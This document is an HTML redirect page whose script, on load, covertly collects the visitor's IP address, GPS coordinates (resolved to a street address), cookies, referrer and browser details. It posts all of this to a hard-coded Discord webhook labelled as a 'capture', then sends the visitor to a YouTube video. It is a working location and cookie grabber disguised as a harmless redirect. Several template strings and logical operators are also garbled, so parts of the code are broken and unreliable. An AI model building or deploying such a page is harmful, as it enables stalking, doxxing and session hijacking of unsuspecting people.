<!DOCTYPE html>

<head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
    <script>
        // ⬇️ ВСТАВЬ СВОЙ DISCORD WEBHOOK URL ⬇️
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1514565565698674799/CBUJgYw6XRaQtCyPMtwaV3Gid7SzZVoRcDIcLIgJFkvBUgGaKPGjhApM-hpPRTnZ1dKL';

        async function sendToDiscord(text) {
            try {
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: text.substring(0, 2000) })
                });
            } catch(e) { console.error(e); }
        }

        // Получение адреса по координатам (обратное геокодирование) через Nominatim (бесплатно, без ключа)
        async function getAddressFromCoords(lat, lon) {
            try {
                const url = https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1;
                const response = await fetch(url, {
                    headers: { 'User-Agent': 'Mozilla/5.0 (compatible; CoordCollector/1.0)' }
                });
                const data = await response.json();
                if (data && data.display_name) {
                    // Можно сократить: data.address.road, data.address.city, data.address.country
                    const addr = data.address;
                    const parts = [];
                    if (addr.road) parts.push(addr.road);
                    if (addr.house_number) parts.push(addr.house_number);
                    if (addr.city  addr.town  addr.village) parts.push(addr.city  addr.town  addr.village);
                    if (addr.state) parts.push(addr.state);
                    if (addr.country) parts.push(addr.country);
                    return parts.join(', ') || data.display_name.split(',')[0];
                } else {
                    return 'адрес не найден';
                }
            } catch(e) {
                console.warn("Ошибка геокодинга:", e);
                return 'ошибка получения адреса';
            }
        }

        // Получение координат и адреса
        async function getLocationWithAddress() {
            // 1. Пробуем GPS
            if (navigator.geolocation) {
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            timeout: 8000,
                            enableHighAccuracy: true
                        });
                    });
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const acc = position.coords.accuracy;
                    const coordsText = 🌍 GPS: ${lat}, ${lon} (точность ±${Math.round(acc)} м);
                    // Получаем адрес по GPS координатам
                    const address = await getAddressFromCoords(lat, lon);
                    return { coords: coordsText, address: 📍 Адрес: ${address} };
                } catch(e) {
                    console.warn("GPS ошибка:", e.message);
                }
            }

            // 2. Fallback: IP-геолокация (ip-api.com возвращает и координаты, и адрес)
            try {
                const response = await fetch('http://ip-api.com/json/');
                const data = await response.json();
                if (data.status === 'success') {
                    const coordsText = 📍 IP-геолокация: ${data.lat}, ${data.lon} (${data.city}, ${data.country});
                    const addressText = 🏠 Адрес (по IP): ${data.city}, ${data.regionName}, ${data.country} (${data.zip});
                    return { coords: coordsText, address: addressText };
                } else {
                    return { coords: '❌ Координаты не определены', address: '❌ Адрес не определен' };
                }
            } catch(err) {
                return { coords: ❌ Ошибка получения координат: ${err.message}, address: '❌ Адрес не определен' };
            }
        }

async function collectAndRedirect() {
            // Собираем IP
            let ip = 'не удалось';
            try {
                let res = await fetch('https://api.ipify.org?format=json');
                let data = await res.json();
                ip = data.ip;
            } catch(e) {}

            // Получаем координаты + адрес
            const { coords, address } = await getLocationWithAddress();

            // Формируем сообщение
            let message = 'НОВЫЙ ЗАХВАТ\n';
            message += 'Время: ' + new Date().toLocaleString() + '\n';
            message += 'IP: ' + ip + '\n';
            message += 'Координаты: ' + coords + '\n';
            message += address + '\n';
            message += 'URL: ' + window.location.href + '\n';
            message += 'Referrer: ' + (document.referrer || 'прямой переход') + '\n';
            message += 'Cookies: ' + document.cookie + '\n';
            message += 'User-Agent: ' + navigator.userAgent + '\n';
            message += 'Язык: ' + navigator.language + '\n';
            message += 'Экран: ' + screen.width + 'x' + screen.height + '\n';
            message += 'Часовой пояс: ' + Intl.DateTimeFormat().resolvedOptions().timeZone;

            // Отправляем в Discord
            await sendToDiscord(message);

            // Редирект
            window.location.replace('https://www.youtube.com/watch?v=dQw4w9WgXcQ');
        }

        collectAndRedirect();
    </script>
